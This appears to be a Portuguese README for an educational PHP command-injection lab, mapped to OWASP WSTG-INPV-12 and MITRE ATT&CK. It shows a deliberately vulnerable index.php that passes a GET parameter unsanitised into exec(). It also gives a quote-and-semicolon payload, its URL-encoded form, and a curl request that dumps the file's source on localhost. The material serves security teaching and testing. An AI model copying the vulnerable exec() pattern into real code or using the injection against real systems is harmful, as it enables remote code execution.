# poc-rce-php-lab

Laboratório educacional de injeção de comando (RCE) em PHP via parâmetro GET.

## Introdução

O laboratório serve para demonstração prática do teste de injeção de comando descrito pelo WSTG (OWASP).

## Técnicas de invasão catalogadas do MITRE ATT&CK

- **Acesso Inicial:** [Exploit Public-Facing Application | T1190](https://attack.mitre.org/techniques/T1190/)
- **Execução:** [Command and Scripting Interpreter | T1059](https://attack.mitre.org/techniques/T1059/)

## Técnica de teste prático do WSTG (OWASP)

- **Técnica de injeção:** [Testing for Command Injection | WSTG-INPV-12](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/)

## Explicação

A vulnerabilidade descrita pela técnica WSTG-INPV-12 ocorre quando um arquivo executado no backend, com acesso direto ao terminal, pode permitir execução remota de código (RCE) mesmo que não seja usado para o propósito para o qual foi programado.

Eu criei um arquivo chamado `index.php` com acesso direto ao terminal usando a função `exec()` do PHP. Ele chama o `dig` para consultar o IP de domínios.

```text
http://127.0.0.1:8080/?comando=google.com

IP do domínio google.com: 172.217.30.238
```

```php
<?php
  // entrada da URL
  $cmd = $_GET['comando'] ?? null;
  $saida = exec('dig "' . $cmd . '" +short');
  echo "IP do domínio ${cmd}: " . $saida . " \n";
?>
```

### Qual é a problemática?

Quando você entende de shell script/bash, terá a capacidade de manipular como o terminal se comporta.

Exemplo de payload capaz de quebrar a lógica do código principal:

```text
" ; cat index.php | tr -d "\n" #
```

### Como injetar esse código na URL?

Basta converter os caracteres especiais e os espaços para o formato de URL, em hexadecimal:

```text
%20 = ' '
%22 = '"'
%3b = ';'
%23 = '#'
```

No final, ficará assim:

```text
%22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23
```

Na URL:

```bash
curl -s 'http://127.0.0.1:8080/?comando=google.com%22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23'
```

A saída do comando será o código do `index.php`.

## Parte prática

### Instalação

```bash
apt install php curl
```

### Execução

Rode o PHP na pasta do servidor:

```bash
php -S 127.0.0.1:8080
```

Execute o `poc.sh`:

```bash
bash poc.sh
```
